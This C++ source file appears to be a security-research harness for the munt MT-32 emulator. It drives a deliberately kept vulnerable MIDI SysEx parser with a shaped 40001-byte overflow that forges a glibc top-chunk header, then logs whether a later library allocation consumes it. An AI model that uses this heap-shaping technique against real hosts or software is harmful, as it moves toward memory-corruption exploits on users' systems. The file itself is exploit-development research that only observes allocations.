// W184 bounded experiment: with the verbatim pinned vulnerable parser built
// as a separate lab variant that exposes munt's own MT32EMU_WITH_TESTING
// accessor hooks, use the upstream FakeROMs facility to OPEN a real Synth.
// That makes the in-library consumer W183 could not reach available:
//   Synth::playSysex() -> MidiEventQueue::pushSysex() -> new Bit8u[len]
// Question: after a shaped 40001-byte overflow forges glibc's top-chunk size,
// does that real library allocation consume the forged header and write the
// host's second SysEx into the corrupted tail?
// Hooks only OBSERVE allocations; they never consume corrupted metadata.
// No real ROM, real host or chosen-overflow-byte readback: rung 4 only.
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>

#include "mt32emu.h"
#include "test/FakeROMs.h"

using namespace MT32Emu;

static unsigned char *g_buf = NULL;
static size_t g_grows = 0;
static int g_armed = 0;
#define MAX_LOG 24
static unsigned char *g_new_ptr[MAX_LOG];
static size_t g_new_len[MAX_LOG];
static int g_new_count = 0;
static unsigned char *g_mal_ptr[MAX_LOG];
static size_t g_mal_len[MAX_LOG];
static int g_mal_count = 0;

extern "C" void *__real_malloc(size_t);

extern "C" void *__wrap_malloc(size_t n) {
	void *p = __real_malloc(n);
	if (g_armed && g_mal_count < MAX_LOG) {
		g_mal_ptr[g_mal_count] = (unsigned char *)p;
		g_mal_len[g_mal_count] = n;
		++g_mal_count;
	}
	return p;
}

void *operator new[](size_t n) {
	void *p = __real_malloc(n);
	if (g_armed && n == 32768 && g_buf == NULL) {
		g_buf = (unsigned char *)p;
		++g_grows;
	}
	if (g_armed && g_new_count < MAX_LOG) {
		g_new_ptr[g_new_count] = (unsigned char *)p;
		g_new_len[g_new_count] = n;
		++g_new_count;
	}
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }

static void reset_log(void) {
	g_new_count = 0;
	g_mal_count = 0;
}

// Direct write(2): no stdio allocation after the overflow.
static void emit(const char *fmt, ...) {
	char line[512];
	va_list ap;
	va_start(ap, fmt);
	int n = vsnprintf(line, sizeof line, fmt, ap);
	va_end(ap);
	if (n > 0) {
		if ((size_t)n > sizeof line) n = sizeof line;
		ssize_t ignored = write(1, line, (size_t)n);
		(void)ignored;
	}
}

static void hexdump(const char *label, unsigned char *p, size_t n) {
	char line[256];
	size_t at = 0;
	for (size_t i = 0; i < n; ++i) {
		snprintf(line + at, sizeof line - at, "%02x", p[i]);
		at += 2;
	}
	emit("%s=%s\n", label, line);
}

static void header(const char *label) {
	if (!g_buf) return;
	hexdump(label, g_buf + 32768, 12);
}

static void wide(const char *label) {
	if (!g_buf) return;
	hexdump(label, g_buf + 32784, 16);
}

static void fill_attack(Bit8u *buf, bool shape) {
	memset(buf, 0x5a, 40001);
	buf[0] = 0xF0;
	// 0x10001: plausible glibc top-chunk size, all bytes <= 0x7f so the
	// SysEx scanner accepts them (pinned alphabet constraint, W170).
	if (shape)
		for (size_t i = 0; i < 8; ++i)
			buf[32776 + i] = (Bit8u)(0x10001ULL >> (8 * i));
}

static void fill_good(Bit8u *buf, Bit8u tag) {
	memset(buf, tag, 102);
	buf[0] = 0xF0;
	buf[101] = 0xF7;
}

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "shaped";
	const bool shape = 0 == strcmp(mode, "shaped");
	const bool safe = 0 == strcmp(mode, "safe");
	const bool consume = 0 != strcmp(mode, "none");
	const Bit32u len = safe ? 102u : 40001u;
	Bit8u *stream = new Bit8u[len];
	if (safe) {
		fill_good(stream, 0x37);
	} else {
		fill_attack(stream, shape);
	}

	// Upstream test facility: synthetic ROM images with the expected SHA1,
	// created in-process. Built into this lab variant of the library only.
	Test::ROMSet roms;
	roms.initMT32New();
	Synth synth;
	bool opened = synth.open(*roms.getControlROMImage(), *roms.getPCMROMImage());
	emit("opened=%d\n", opened ? 1 : 0);

	DefaultMidiStreamParser parser(synth);
	g_armed = 1;
	parser.parseStream(stream, len);
	header("pre_consume_header");
	reset_log();

	if (consume) {
		Bit8u good[102];
		fill_good(good, 0x37);
		bool sent = synth.playSysex(good, 102);
		emit("playSysex=%d\n", sent ? 1 : 0);
	}

	header("post_consume_header");
	wide("tail");
	emit("grows=%zu new_count=%d mal_count=%d\n", g_grows, g_new_count, g_mal_count);
	for (int i = 0; i < g_new_count && i < MAX_LOG; ++i) {
		long delta = g_buf ? (long)(g_new_ptr[i] - g_buf) : -1L;
		emit("new[%d] len=%zu ptr=%p delta=%ld\n", i, g_new_len[i],
			(void *)g_new_ptr[i], delta);
	}
	for (int i = 0; i < g_mal_count && i < MAX_LOG; ++i) {
		long delta = g_buf ? (long)(g_mal_ptr[i] - g_buf) : -1L;
		emit("malloc[%d] len=%zu ptr=%p delta=%ld\n", i, g_mal_len[i],
			(void *)g_mal_ptr[i], delta);
	}
	return 0; // leave allocations live: no frees after forged metadata
}
